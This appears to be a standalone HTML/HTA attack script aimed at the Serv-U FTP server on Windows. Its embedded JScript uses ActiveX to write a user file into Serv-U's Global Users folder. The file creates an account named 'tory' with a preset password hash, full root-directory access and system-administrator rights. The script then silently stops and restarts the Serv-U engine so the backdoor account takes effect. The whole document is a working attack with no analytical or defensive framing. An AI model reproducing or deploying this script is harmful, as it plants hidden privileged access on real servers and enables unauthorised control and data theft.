<html>
<head>
    <script>
        try { 
            var sFolderPath = "C:\\ProgramData\\RhinoSoft\\Serv-U\\Users\\Global Users";
            var fso0 = new ActiveXObject('Scripting.FileSystemObject');
            if (!fso0.FolderExists(sFolderPath)) {
                    fso0.CreateFolder(sFolderPath);        
            }
            var fso;
            var data = ">>> VERSION 2 <<<\r\nCUser\r\nUser\r\n0\r\n0\r\n14\r\nCRhinoDateTimeAttr\r\nStatisticsStartTime\r\n1\r\n1\r\nVal\r\n1622098423\r\n<<- StatisticsStartTime\r\nCRhinoUlongLongAttr\r\nRtServerStartTime\r\n1\r\n1\r\nVal\r\n1622075299\r\n<<- RtServerStartTime\r\nCDailyCount\r\nRtDailyCount\r\n1\r\n0\r\n25\r\nCRhinoUintAttr\r\nLastHour\r\n1\r\n1\r\nVal\r\n6\r\n<<- LastHour\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\nCRhinoUlongLongAttr\r\nHourTotal\r\n0\r\n1\r\nVal\r\n0\r\n<<- HourTotal\r\n<<- RtDailyCount\r\nCRhinoFileNameStringAttr\r\nLoginID\r\n1\r\n1\r\nVal\r\ntory\r\n<<- LoginID\r\nCRhinoDateTimeAttr\r\nPasswordChangedOn\r\n1\r\n1\r\nVal\r\n1622098423\r\n<<- PasswordChangedOn\r\nCRhinoUintAttr\r\nPasswordEncryptMode\r\n1\r\n1\r\nVal\r\n1\r\n<<- PasswordEncryptMode\r\nCRhinoBoolAttr\r\nPasswordUTF8\r\n1\r\n1\r\nVal\r\n1\r\n<<- PasswordUTF8\r\nCUserPasswordAttr\r\nPassword\r\n1\r\n1\r\nVal\r\n00:DDAC510D6348F0D1CA9D169BF3835DCE1EC5A7AE344964F2DA753991D34C015DEB91B64437A9C99A2AE8EC3CD850694F\r\n<<- Password\r\nCDirAccess\r\nDirAccess\r\n0\r\n0\r\n2\r\nCDirFileAccessPathAttr\r\nDir\r\n1\r\n1\r\nVal\r\n\\\\\r\n<<- Dir\r\nCRhinoUintAttr\r\nAccess\r\n1\r\n1\r\nVal\r\n7999\r\n<<- Access\r\n<<- DirAccess\r\nCDirPathAttr\r\nHomeDir\r\n0\r\n1\r\nVal\r\n\\\\\r\n<<- HomeDir\r\nCRhinoUintAttr\r\nAdminType\r\n0\r\n1\r\nVal\r\n2\r\n<<- AdminType\r\nCRhinoBoolAttr\r\nLockInHomeDir\r\n0\r\n1\r\nVal\r\n0\r\n<<- LockInHomeDir\r\nCRhinoUlongLongAttr\r\nQuota\r\n0\r\n1\r\nVal\r\n0\r\n<<- Quota\r\nCRhinoBoolAttr\r\nIncludeRespCodesInMsgFiles\r\n0\r\n1\r\nVal\r\n1\r\n<<- IncludeRespCodesInMsgFiles\r\n<<- User\r\n";
            fso=new ActiveXObject("Scripting.FileSystemObject"); 
            var fhandle = fso.createtextfile("C:\\ProgramData\\RhinoSoft\\Serv-U\\Users\\Global Users\\tory.Archive",true);
            fhandle.write(data);
            fhandle.close()
        } catch (e) { 
            
        } 

        var sleep = function(time) {
            var startTime = new Date().getTime() + parseInt(time, 10);
            while(new Date().getTime() < startTime) {}
        };

        s = new ActiveXObject("WScript.Shell");
        s.run("\"C:\\Program Files\\RhinoSoft\\Serv-U\\Serv-U-Tray.exe\" -stopengine",0)
        sleep(1000)
        s.run("\"C:\\Program Files\\RhinoSoft\\Serv-U\\Serv-U.exe\" -startservice",0)
        window.close();

    </script>
</head>
</html>
